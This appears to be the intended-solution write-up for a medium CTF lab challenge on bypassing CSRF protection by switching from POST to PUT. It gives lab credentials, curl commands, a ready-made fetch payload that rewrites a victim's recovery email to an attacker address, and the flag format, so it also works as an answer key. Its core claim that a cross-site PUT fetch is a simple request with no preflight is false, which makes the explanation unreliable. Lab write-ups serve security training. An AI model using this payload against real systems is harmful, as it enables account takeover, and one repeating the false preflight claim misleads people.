# CSRF — MethodSwitch · Shipl (difficulty: medium)

`POST /account/recovery-email` changes the logged-in user's recovery email and **does** validate a per-session CSRF token (the account form carries it; `SEC-31` claims "all state changes require it"). However the same change handler was later mounted a second time at **`PUT /account/recovery-email`** for Shipl's API clients — registered without the token check (the account page even mentions the PUT variant). A cross-site `fetch` issuing a PUT with no custom headers is still a simple request (no preflight), so the protection is bypassed by switching the HTTP method.

Intended path:
1. Log in at http://victim.target.lab:8119/ as `0xnhsec` / `vlh-tester-01`; open http://victim.target.lab:8119/account — the POST form carries a hidden `csrf_token`.
2. Confirm the asymmetry: `curl -si -b "sid=<sid>" -X POST -H 'Content-Type: application/json' -d '{"recovery_email":"attacker@evil.example"}' http://victim.target.lab:8119/account/recovery-email` → 403 (token missing), but the same body with `-X PUT` succeeds.
3. Store the artifact on the exploit server: `<script>fetch('http://victim.target.lab:8119/account/recovery-email',{method:'PUT',credentials:'include',headers:{'Content-Type':'application/json'},body:'{"recovery_email":"attacker@evil.example"}'})</script>`
4. Trigger the victim bot: `curl -X POST http://collector.target.lab:8119/victim -H 'Content-Type: application/json' -d '{"url":"http://victim.target.lab:8119/account/recovery-email","method":"PUT","body":{"recovery_email":"attacker@evil.example"}}'`
5. `curl http://collector.target.lab:8119/verify` → flag (innocent's `recovery_email` row changed).

Flag: `DSLTV{CSRF-MethodSwitch-<9-10 digits>}` (event-verified — minted by the verifier, regenerated every restart).
